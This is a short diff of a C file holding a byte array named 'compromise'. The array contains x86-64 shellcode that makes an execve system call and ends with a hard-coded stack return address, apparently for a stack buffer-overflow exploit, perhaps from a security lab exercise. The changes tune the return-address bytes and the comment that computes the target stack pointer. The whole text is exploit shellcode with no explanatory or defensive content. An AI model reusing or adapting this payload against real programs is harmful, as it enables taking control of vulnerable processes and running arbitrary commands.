@@ -41,7 +41,7 @@ char compromise[159] = {
                                             //            ; execve system call
     0xB0, 0x3B,                 			//41          mov al,0x3b
     0x48, 0xBF,                 		  	//43         mov rdi,rsi
-    //488D771A    
+
     0x48, 0x8D,0x76,0x1A,                   //47         lea rsi,[byte rdi + arrayAddr - exeStr]
     0x48, 0x89, 0xE2,                  	    //48          mov rdx,rsp
     0x48, 0xC1, 0xEA, 0x20,                 //52          shr rdx,32
@@ -73,8 +73,8 @@ char compromise[159] = {
     0xFF, 0xFF, 0xFF, 0xFF,0xFF, 0xFF, 0xFF, 0xFF,//145         dq 0xffffffffffffffff
                                         	//newAddr:   dd newAddr-start
      // ret addy
-     0xFE,0xDA,0xFF,0xFF,0xFF,0x7F,0x00    //154
-    //rsp = 0x7fffffffdb98 - 154 +1 = 0x7fffffffdaff
+     0x04,0xDB,0xFF,0xFF,0xFF,0x7F,0x00    //154
+    //rsp = 0x7fffffffdb98 - 153 +1 = 0x7fffffffdb00
 };
 
 // string variable to probe the stack and find the correct
